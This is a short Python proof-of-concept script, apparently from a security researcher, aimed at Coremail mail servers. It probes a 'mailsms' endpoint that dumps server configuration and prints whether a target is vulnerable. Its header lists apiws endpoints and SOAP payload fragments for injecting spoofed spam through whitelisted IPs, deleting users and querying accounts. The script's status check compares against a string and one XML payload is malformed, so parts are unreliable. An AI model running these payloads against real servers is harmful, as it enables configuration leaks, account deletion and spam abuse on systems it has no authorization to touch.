#-*- Coding: utf-8 -*-
'''
Author: Vulkey_Chen
Email: gh0stkey@hi-ourlife.com
Website: www.hi-ourlife.com
1.About: mailsms config dump PoC
/mailsms/s?func=ADMIN:appState&dumpConfig=/
2.apiws
http(s)://host/apiws/services/
http(s)://host/./apiws/services/
伪造垃圾邮件进白名单payload:
<ns1:sendmail2OneOrMore.........></ns1:sendmail2OneOrMore> 正常能发送这个包的都是白名单IP
<deleteUser xmlns="http://coremail.cn/svncws">xxx</deleteUser>
<nsl:queryTheUser xmlns:nsl="http://coremail.cn/apiws"><loginName>admin@admin.com<loginName></nsl:queryTheUser>
'''

import requests,sys

def mailsmsPoC(url):
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    r = requests.get(url)
    if (r.status_code != '404') and ("/home/coremail" in r.text):
        print("mailsms is vulnerable: {0}".format(url))
    else:
        print("mailsms is safe!")

if __name__ == '__main__':
    try:
        mailsmsPoC(sys.argv[1])
    except:
        print("usage: python poc.py http://hi-ourlife.com/")